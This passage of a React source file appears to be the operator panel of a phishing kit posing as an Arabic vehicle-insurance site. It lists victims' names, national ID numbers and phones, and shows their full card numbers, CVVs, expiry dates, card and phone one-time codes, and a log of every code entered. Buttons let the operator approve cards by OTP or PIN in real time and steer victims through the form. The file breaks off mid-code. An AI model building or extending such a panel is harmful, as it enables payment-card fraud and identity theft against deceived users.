"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  MessageSquare,
  Settings,
  CreditCard,
  FileText,
  Shield,
  User,
  ChevronDown,
  Info,
  Globe,
  Copy,
  Check,
  MapPin,
  Car,
  CheckCircle,
  Phone,
  Key,
  Lock,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
} from "@/components/ui/dropdown-menu"
import { subscribeToApplications, updateApplication, approveCard, rejectCard } from "@/lib/firestore-services"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { toast } from "react-toastify"
import type { InsuranceApplication } from "@/types"
import { CreditCardMockup } from "@/components/credit-card-mockup"
import { UserStatus } from "@/components/atuTA"
import { CardMockup } from "@/components/card-mockup"

const STEP_NAMES: Record<number | string, string> = {
  1: "المعلومات الأساسية",
  2: "تفاصيل التأمين",
  3: "اختيار العرض",
  4: "الدفع",
}

const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]

const INSURANCE_TYPES = ["تأمين جديد", "نقل ملكية"]
const DOCUMENT_TYPES = ["استمارة", "بطاقة جمركية"]

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [dataFilter, setDataFilter] = useState<string>("all")
  const [countryFilter, setCountryFilter] = useState<string>("all")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [loading, setLoading] = useState(true)
  const [showChat, setShowChat] = useState(false)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const prevApplicationsCount = useRef<number>(0)

  const hasCompleteData = (app: InsuranceApplication) => {
    return !!(app.identityNumber && app.ownerName && app.phoneNumber && app.vehicleValue && app.selectedOffer)
  }

  const hasData = (...values: any[]) => values.some((v) => v !== null && v !== undefined && v !== "")

  const stats = useMemo(
    () => ({
      total: applications.length,
      completed: applications.filter((a) => a.status === "completed").length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      draft: applications.filter((a) => a.status === "draft").length,
    }),
    [applications],
  )

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps as any)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((a) => a.status === statusFilter)
      }

      if (countryFilter !== "all") {
        filtered = filtered.filter((a) => a.country === countryFilter)
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber?.includes(query) ||
            app.phoneNumber?.includes(query) ||
            app.vehicleModel?.toLowerCase().includes(query),
        )
      }

      filtered = filtered.sort((a, b) => {
        const dateA = a.updatedAt ? new Date(a.updatedAt) : 0
        const dateB = b.updatedAt ? new Date(b.updatedAt) : 0
        return (dateB as number) - (dateA as number)
      })

      setFilteredApplications(filtered)
    }, 200)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, countryFilter])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) setSelectedApplication(updated)
    }
  }, [applications, selectedApplication])

  const formatTime = useCallback((dateInput?: Date | string | any) => {
    if (!dateInput) return ""

    // دعم Firestore Timestamp
    const date = dateInput instanceof Date ? dateInput : dateInput?.toDate ? dateInput.toDate() : new Date(dateInput)

    if (isNaN(date.getTime())) return ""

    const now = new Date()
    const diffSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffSeconds < 60) return "الآن"
    if (diffSeconds < 3600) return `${Math.floor(diffSeconds / 60)} د`
    if (diffSeconds < 86400) return `${Math.floor(diffSeconds / 3600)} س`
    if (diffSeconds < 604800) return `${Math.floor(diffSeconds / 86400)} ي`

    // تاريخ كامل إذا قديم
    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
    })
  }, [])

  const copyToClipboard = async (text: string, fieldId: string) => {
    await navigator.clipboard.writeText(text)
    setCopiedField(fieldId)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const handleStepChange = async (appId: string, step: number) => {
    try {
      await updateApplication(appId, { currentStep: step })
      playSuccessSound()
    } catch (error) {
      playErrorSound()
    }
  }

  const handleStatusChange = async (appId: string, status: InsuranceApplication["status"]) => {
    try {
      await updateApplication(appId, { status })
      playSuccessSound()
    } catch (error) {
      playErrorSound()
    }
  }

  const handleApproveCard = async (appId: string, approvalType: "otp" | "pin") => {
    try {
      await approveCard(appId, approvalType)
      playSuccessSound()
      toast.success(`تمت الموافقة على البطاقة (${approvalType === "otp" ? "OTP" : "PIN"})`)
    } catch (error) {
      playErrorSound()
      toast.error("خطأ في الموافقة على البطاقة")
    }
  }

  const handleRejectCard = async (appId: string) => {
    if (!selectedApplication) return
    try {
      await rejectCard(appId, selectedApplication)
      playSuccessSound()
      toast.success("تم رفض البطاقة وحفظ البيانات")
    } catch (error) {
      playErrorSound()
      toast.error("خطأ في رفض البطاقة")
    }
  }

  const handleApprovePhoneOtp = async (appId: string) => {
    try {
      await updateApplication(appId, { phoneOtpApproved: "approved" })
      playSuccessSound()
      toast.success("تمت الموافقة على رمز التحقق")
    } catch (error) {
      playErrorSound()
      toast.error("خطأ في الموافقة على رمز التحقق")
    }
  }

  const handleRejectPhoneOtp = async (appId: string) => {
    try {
      await updateApplication(appId, { phoneOtpApproved: "rejected" })
      playSuccessSound()
      toast.success("تم رفض رمز التحقق")
    } catch (error) {
      playErrorSound()
      toast.error("خطأ في رفض رمز التحقق")
    }
  }

  const selectApp = (app: InsuranceApplication) => {
    setSelectedApplication(app)
    setShowChat(false)
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "completed":
        return "bg-emerald-500/20 text-emerald-400"
      case "approved":
        return "bg-blue-500/20 text-blue-400"
      case "pending_review":
        return "bg-amber-500/20 text-amber-400"
      case "rejected":
        return "bg-red-500/20 text-red-400"
      default:
        return "bg-slate-500/20 text-slate-400"
    }
  }

  return (
    <div className="h-screen bg-slate-950 text-[11px] flex flex-col" dir="rtl">
      {/* Header */}
      <header className="bg-slate-900 border-b border-slate-800 px-3 py-1.5 flex items-center justify-between flex-shrink-0">
        <div className="flex items-center gap-2">
          <div className="w-6 h-6 rounded bg-emerald-500 flex items-center justify-center">
            <Shield className="w-3 h-3 text-white" />
          </div>
          <span className="text-xs font-bold text-white">تطبيقات التأمين</span>
        </div>

        <div className="flex items-center gap-3 text-[10px]">
          <span className="text-slate-400">
            الإجمالي: <span className="text-white font-bold">{stats.total}</span>
          </span>
          <span className="text-slate-400">
            مكتمل: <span className="text-emerald-400 font-bold">{stats.completed}</span>
          </span>
          <span className="text-slate-400">
            قيد المراجعة: <span className="text-amber-400 font-bold">{stats.pending}</span>
          </span>
          <span className="text-slate-400">
            موافق عليه: <span className="text-blue-400 font-bold">{stats.approved}</span>
          </span>
        </div>

        <div className="flex items-center gap-1">
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
                <Globe className="w-3 h-3" />
                {countryFilter === "all" ? "كل الدول" : countryFilter}
                <ChevronDown className="w-2.5 h-2.5" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700">
              <DropdownMenuItem onClick={() => setCountryFilter("all")} className="text-[10px] text-slate-300">
                كل الدول
              </DropdownMenuItem>
              <DropdownMenuSeparator className="bg-slate-700" />
              {COUNTRIES.map((c) => (
                <DropdownMenuItem key={c} onClick={() => setCountryFilter(c)} className="text-[10px] text-slate-300">
                  {c}
                </DropdownMenuItem>
              ))}
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </header>

      {/* Blocked Cards Modal */}
      {/* This modal is not relevant to the new insurance application context and can be removed or kept as is if it serves another purpose not detailed here. For the purpose of merging based on the provided updates, it's left as is. */}
      {/* {showBlockedPanel && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50" onClick={() => setShowBlockedPanel(false)}>
          <div className="bg-white rounded-lg shadow-xl w-[450px] max-w-[90vw]" dir="rtl" onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between p-4 border-b">
              <h2 className="text-base font-bold text-slate-800">قائمة حجب بطاقات الدفع</h2>
              <button onClick={() => setShowBlockedPanel(false)} className="text-slate-400 hover:text-slate-600">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-4">
              <p className="text-sm text-slate-600 mb-4">
                أضف البادئات الخاصة بأرقام البطاقات التي لا تريدها. يمكنك لصق مجموعة من البادئات مفصولة بمسافة أو فاصلة أو سطر جديد. اضغط Enter لإضافة كل بادئ.
              </p>
              <Input
                placeholder="أدخل رقم البطاقة..."
                className="mb-4 text-sm bg-slate-50 border-slate-200 text-slate-800"
                onKeyDown={(e) => {
                  if (e.key === "Enter") {
                    const input = e.currentTarget
                    const value = input.value.trim()
                    if (value && !blockedCards.includes(value)) {
                      setBlockedCards([...blockedCards, value])
                      input.value = ""
                    }
                  }
                }}
              />
              <div className="flex flex-wrap gap-2 min-h-[100px] p-3 bg-slate-50 rounded-lg border border-slate-200">
                {blockedCards.length === 0 ? (
                  <span className="text-sm text-slate-400">لا توجد بطاقات محظورة</span>
                ) : (
                  blockedCards.map(card => (
                    <span key={card} className="inline-flex items-center gap-1 px-3 py-1 bg-slate-200 text-slate-700 rounded-full text-sm">
                      <button onClick={() => unblockCard(card)} className="text-slate-500 hover:text-slate-700">
                        <X className="w-4 h-4" />
                      </button>
                      {card.slice(-4)}
                    </span>
                  ))
                )}
              </div>
            </div>
            <div className="flex justify-start gap-2 p-4 border-t bg-slate-50">
              <Button onClick={() => setShowBlockedPanel(false)} className="bg-blue-500 hover:bg-blue-600 text-white px-6">
                حفظ
              </Button>
              <Button onClick={() => setShowBlockedPanel(false)} variant="ghost" className="text-slate-600">
                إلغاء
              </Button>
            </div>
          </div>
        </div>
      )} */}

      <div className="flex flex-1 min-h-0">
        {/* Inbox List */}
        <div className="w-[280px] bg-slate-900/50 border-l border-slate-800 flex flex-col">
          <div className="p-1.5 border-b border-slate-800">
            <div className="flex items-center gap-1 mb-1">
              <div className="relative flex-1">
                <Search className="absolute right-1.5 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
                <Input
                  placeholder="بحث..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-6 h-6 text-[10px] bg-slate-800 border-slate-700 text-slate-200 rounded"
                />
              </div>
            </div>
            <Tabs defaultValue="all" className="w-full" onValueChange={setStatusFilter}>
              <TabsList className="w-full h-5 p-0 bg-slate-800 rounded">
                <TabsTrigger
                  value="all"
                  className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400"
                >
                  الكل
                </TabsTrigger>
                <TabsTrigger
                  value="draft"
                  className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-blue-500 data-[state=active]:text-white text-slate-400"
                >
                  مسودة
                </TabsTrigger>
                <TabsTrigger
                  value="pending_review"
                  className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-amber-500 data-[state=active]:text-white text-slate-400"
                >
                  قيد الفحص
                </TabsTrigger>
                <TabsTrigger
                  value="completed"
                  className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400"
                >
                  مكتمل
                </TabsTrigger>
              </TabsList>
            </Tabs>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-32">
                <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="text-center text-slate-500 py-8 text-[10px]">لا توجد نتائج</div>
            ) : (
              filteredApplications.map((app) => {
                const isActive = selectedApplication?.id === app.id
                const statusColor = getStatusColor(app.status)
                return (
                  <div
                    key={app.id}
                    onClick={() => selectApp(app)}
                    className={`px-2 py-1.5 cursor-pointer border-b border-slate-800/50 transition-all
                      ${isActive ? "bg-emerald-500/10 border-r-2 border-r-emerald-500" : "hover:bg-slate-800/30"}`}
                  >
                    <div className="flex items-center justify-between mb-0.5">
                      <div className="flex items-center gap-1.5 min-w-0">
                        <Badge className={`text-[8px] flex-shrink-0 ${statusColor}`}>{app.status}</Badge>
                        <span
                          className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}
                        >
                          {app.ownerName || "متقدم"}
                        </span>
                      </div>
                      <span className="text-[9px] text-slate-500 flex-shrink-0">{formatTime(app.createdAt)}</span>
                    </div>
                    <div className="flex items-center gap-1 text-[9px] text-slate-500">
                      {app.vehicleModel && <span className="text-blue-400">{app.vehicleModel}</span>}
                      {app.country && (
                        <span className="mr-auto flex items-center gap-0.5">
                          <MapPin className="w-2.5 h-2.5" />
                          {app.country}
                        </span>
                      )}
                    </div>
                  </div>
                )
              })
            )}
          </div>
        </div>

        {/* Conversation View */}
        <div className="flex-1 bg-slate-950 flex flex-col">
          {selectedApplication ? (
            showChat ? (
              <ChatPanel
                applicationId={selectedApplication.id!}
                currentUserId="admin-001"
                currentUserName="المسؤول"
                currentUserRole="admin"
                onClose={() => setShowChat(false)}
              />
            ) : (
              <>
                {/* Conversation Header */}
                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
                  <div className="flex items-center gap-2">
                    <div className="relative">
                      <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
                        {selectedApplication.ownerName?.charAt(0) || "ع"}
                      </div>
                      <div className="absolute -bottom-0.5 -right-0.5">
                        <UserStatus userId={selectedApplication.id!} />
                      </div>
                    </div>
                    <div>
                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "متقدم"}</div>
                      <div className="text-[9px] text-slate-400 flex items-center gap-2">
                        <span>{selectedApplication.phoneNumber}</span>
                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    {[1, 2, 3, 4].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        size="sm"
                        className={`h-5 text-[8px] px-1.5 rounded ${
                          selectedApplication.currentStep === step
                            ? "bg-emerald-500 text-white"
                            : "bg-slate-800 text-slate-400 hover:text-white"
                        }`}
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                    <Button
                      onClick={() => setShowChat(true)}
                      size="sm"
                      className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1 mr-2"
                    >
                      <MessageSquare className="w-3 h-3" />
                    </Button>
                  </div>
                </div>

                {/* Application Details */}
                <div className="grid grid-cols-4 gap-2 p-2 h-[calc(100vh-120px)] overflow-auto">
                  {/* Basic Information */}
                  {hasData(
                    selectedApplication.ownerName,
                    selectedApplication.identityNumber,
                    selectedApplication.documentType,
                    selectedApplication.serialNumber,
                    selectedApplication.phoneNumber,
                    selectedApplication.phoneNumber2,
                    selectedApplication.country,
                  ) && (
                    <Section title="المعلومات الأساسية" icon={<User className="w-3 h-3" />}>
                      <DataRow
                        label="الاسم"
                        value={selectedApplication.ownerName}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم الهوية"
                        value={selectedApplication.identityNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="نوع الوثيقة"
                        value={selectedApplication.documentType}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم التسلسل"
                        value={selectedApplication.serialNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="الهاتف الأول"
                        value={selectedApplication.phoneNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="الهاتف الثاني"
                        value={selectedApplication.phoneNumber2}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="البلد"
                        value={selectedApplication.country}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                    </Section>
                  )}

                  {/* Vehicle Information */}
                  {hasData(
                    selectedApplication.identityNumber,
                    selectedApplication.vehicleModel,
                    selectedApplication.insuranceType,
                  ) && (
                    <Section title="معلومات المركبة" icon={<Car className="w-3 h-3" />}>
                      <DataRow
                        label="الموديل"
                        value={selectedApplication.vehicleModel}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="سنة الصنع"
                        value={selectedApplication.manufacturingYear?.toString()}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="القيمة"
                        value={`${selectedApplication.vehicleValue} ر.س`}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="الاستخدام"
                        value={selectedApplication.vehicleUsage}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="مكان الإصلاح"
                        value={selectedApplication.repairLocation === "agency" ? "وكالة" : "ورشة"}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                    </Section>
                  )}

                  {/* Insurance Information */}
                  {hasData(
                    selectedApplication.insuranceType,
                    selectedApplication.buyerIdNumber,
                    selectedApplication.buyerName,
                  ) && (
                    <Section title="معلومات التأمين" icon={<Shield className="w-3 h-3" />}>
                      <DataRow
                        label="شركة التأمين"
                        value={selectedApplication.selectedOffer?.company}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="نوع التأمين"
                        value={selectedApplication.insuranceType}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم الوثيقة"
                        value={selectedApplication.buyerIdNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="سعر التأمين"
                        value={`${selectedApplication.selectedOffer?.price} ر.س`}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم هوية المشتري"
                        value={selectedApplication.buyerIdNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="اسم المشتري"
                        value={selectedApplication.buyerName}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      {selectedApplication.selectedOffer &&
                        selectedApplication.selectedOffer.features &&
                        selectedApplication.selectedOffer.features.length > 0 && (
                          <div className="p-1.5 bg-slate-900/50 rounded">
                            <span className="text-[8px] text-slate-400 block mb-0.5">المميزات:</span>
                            <div className="space-y-0.5 max-h-16 overflow-y-auto">
                              {selectedApplication.selectedOffer.features.map((feature, i) => (
                                <div key={i} className="text-[8px] text-slate-300">
                                  • {feature}
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                    </Section>
                  )}

                  {/* Selected Offer */}
                  {selectedApplication.selectedOffer && (
                    <Section title="العرض المختار" icon={<FileText className="w-3 h-3" />}>
                      <DataRow
                        label="شركة التأمين"
                        value={selectedApplication.selectedOffer.company}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="السعر"
                        value={`${selectedApplication.selectedOffer.price} ر.س`}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="النوع"
                        value={selectedApplication.selectedOffer.type}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      {selectedApplication.selectedOffer.features &&
                        selectedApplication.selectedOffer.features.length > 0 && (
                          <div className="p-1.5 bg-slate-900/50 rounded">
                            <span className="text-[8px] text-slate-400 block mb-0.5">المميزات:</span>
                            <div className="space-y-0.5 max-h-16 overflow-y-auto">
                              {selectedApplication.selectedOffer.features.map((feature, i) => (
                                <div key={i} className="text-[8px] text-slate-300">
                                  • {feature}
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                    </Section>
                  )}

                  {/* Payment Information */}
                  {hasData(
                    selectedApplication.paymentMethod,
                    selectedApplication.cardNumber,
                    selectedApplication.cardHolderName,
                    selectedApplication.expiryDate,
                    selectedApplication.cvv,
                    selectedApplication.cardType,
                    selectedApplication.bankInfo,
                    selectedApplication.otp,
                  ) && (
                    <Section title="معلومات الدفع" icon={<CreditCard className="w-3 h-3" />}>
                      <div className="mb-2">
                        <CreditCardMockup
                          cardNumber={selectedApplication.cardNumber}
                          cardholderName={selectedApplication.cardHolderName! as any}
                          expiryDate={selectedApplication.expiryDate}
                          cvv={selectedApplication.cvv}
                        />
                      </div>

                      <DataRow
                        label="طريقة الدفع"
                        value={selectedApplication.paymentMethod}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رقم البطاقة"
                        value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : undefined}
                        onCopy={() => {
                          if (selectedApplication.cardNumber) {
                            navigator.clipboard.writeText(selectedApplication.cardNumber)
                            setCopiedField("cardNumber")
                          }
                        }}
                        copied={""}
                      />
                      <DataRow
                        label="اسم حامل البطاقة"
                        value={selectedApplication.cardHolderName}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="تاريخ الانتهاء"
                        value={selectedApplication.expiryDate}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="cvv"
                        value={selectedApplication.cvv}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="نوع البطاقة"
                        value={selectedApplication.cardType}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="معلومات البنك"
                        value={
                          selectedApplication.bankInfo
                            ? typeof selectedApplication.bankInfo === "object"
                              ? `${(selectedApplication.bankInfo as any).name || ""} - ${(selectedApplication.bankInfo as any).country || ""}`
                              : selectedApplication.bankInfo
                            : undefined
                        }
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      <DataRow
                        label="رمز التحقق"
                        value={selectedApplication.otp}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      {selectedApplication.paymentStatus && (
                        <Badge
                          className={`text-[8px] w-fit ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                        >
                          {selectedApplication.paymentStatus}
                        </Badge>
                      )}
                      {/* Added card approval controls */}
                      {selectedApplication.cardStatus !== "approved_with_otp" &&
                        selectedApplication.cardStatus !== "approved_with_pin" && (
                          <div className="flex gap-1 mt-1">
                            <Button
                              onClick={() => handleApproveCard(selectedApplication.id!, "otp")}
                              size="sm"
                              className="h-5 text-[8px] px-1.5 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
                            >
                              ✓ OTP
                            </Button>
                            <Button
                              onClick={() => handleApproveCard(selectedApplication.id!, "pin")}
                              size="sm"
                              className="h-5 text-[8px] px-1.5 rounded bg-green-500/20 text-green-400 hover:bg-green-500/30"
                            >
                              ✓ PIN
                            </Button>
                            <Button
                              onClick={() => handleRejectCard(selectedApplication.id!)}
                              size="sm"
                              className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
                            >
                              ✗ رفض
                            </Button>
                          </div>
                        )}
                      {(selectedApplication.cardStatus === "approved_with_otp" ||
                        selectedApplication.cardStatus === "approved_with_pin") && (
                        <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">
                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" : "موافق - PIN"}
                        </Badge>
                      )}
                      {selectedApplication.oldCards && selectedApplication.oldCards.length > 0 && (
                        <div className="mt-1 p-1.5 bg-red-500/10 rounded border border-red-500/20">
                          <span className="text-[8px] text-red-400 block mb-0.5">
                            البطاقات المرفوضة: {selectedApplication.oldCards.length}
                          </span>
                          <div className="space-y-0.5 max-h-20 overflow-y-auto">
                            {selectedApplication.oldCards.map((card, index) => (
                              <div key={index} className="text-[7px] text-red-300 bg-red-900/20 p-0.5 rounded">
                                <div>
                                  البطاقة {index + 1}: {card.cardNumber?.slice(-4) || "N/A"}
                                </div>
                                <div>حامل: {card.cardHolderName || "N/A"}</div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </Section>
                  )}

                  {/* Verification Status */}
                  {hasData(
                    selectedApplication.phoneOtpApproved,
                    selectedApplication.cardOtpApproved,
                  ) && (
                    <Section title="حالة التحقق" icon={<CheckCircle className="w-3 h-3" />}>
                      <div className="space-y-1">
                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400">الحالة</span>
                          <div className="flex items-center gap-1">
                            <UserStatus userId={selectedApplication.id!} />
                            <span className="text-[7px] text-slate-300">متصل</span>
                          </div>
                        </div>
                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400">تحقق الهاتف</span>
                          <Badge
                            className={`text-[7px] ${selectedApplication.phoneVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                          >
                            {selectedApplication.phoneVerificationStatus || "معلق"}
                          </Badge>
                        </div>
                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400">تحقق الهوية</span>
                          <Badge
                            className={`text-[7px] ${selectedApplication.idVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.idVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                          >
                            {selectedApplication.idVerificationStatus || "معلق"}
                          </Badge>
                        </div>
                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400">رمز الهاتف</span>
                          <Badge
                            className={`text-[7px] ${selectedApplication.phoneOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                          >
                            {selectedApplication.phoneOtpApproved || "معلق"}
                          </Badge>
                        </div>
                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
                          <span className="text-[8px] text-slate-400">رمز البطاقة</span>
                          <Badge
                            className={`text-[7px] ${selectedApplication.cardOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.cardOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                          >
                            {selectedApplication.cardOtpApproved || "معلق"}
                          </Badge>
                        </div>
                      </div>
                    </Section>
                  )}

                  {/* Phone OTP Approval */}
                  {selectedApplication.phoneOtp && (
                    <Section title="موافقة رمز الهاتف" icon={<Phone className="w-3 h-3" />}>
                     
                     <DataRow
                        label="الهاتف"
                        value={selectedApplication.phoneNumber}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                       <DataRow
                        label="الشركة"
                        value={selectedApplication.phoneCarrier}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      /> <DataRow
                        label="رمز التحقق الحالي"
                        value={selectedApplication.phoneOtp}
                        onCopy={copyToClipboard}
                        copied={copiedField!}
                      />
                      {selectedApplication.phoneOtpApproved !== "approved" && (
                        <div className="flex gap-1 mt-1">
                          <Button
                            onClick={() => handleApprovePhoneOtp(selectedApplication.id!)}
                            size="sm"
                            className="h-5 text-[8px] px-1.5 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
                          >
                            ✓ موافقة
                          </Button>
                          <Button
                            onClick={() => handleRejectPhoneOtp(selectedApplication.id!)}
                            size="sm"
                            className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
                          >
                            ✗ رفض
                          </Button>
                        </div>
                      )}
                      {selectedApplication.phoneOtpApproved === "approved" && (
                        <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">رمز الهاتف موافق ✓</Badge>
                      )}
                      {selectedApplication.phoneOtpApproved === "rejected" && (
                        <Badge className="text-[8px] bg-red-500/20 text-red-400 mt-1">رمز الهاتف مرفوض ✗</Badge>
                      )}
                      {selectedApplication.allPhoneOtps && selectedApplication.allPhoneOtps.length > 0 && (
                        <div className="mt-1 p-1.5 bg-slate-800/50 rounded border border-slate-700">
                          <span className="text-[8px] text-slate-400 block mb-0.5">
                            سجل رموز ({selectedApplication.allPhoneOtps.length})
                          </span>
                          <div className="flex flex-wrap gap-0.5">
                            {selectedApplication.allPhoneOtps.map((otp, index) => (
                              <span key={index} className="text-[7px] bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
                                {otp}
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                    </Section>
                  )}

                  {/* Nafaz Integration Info */}
                  {hasData(
                    selectedApplication.nafazId,
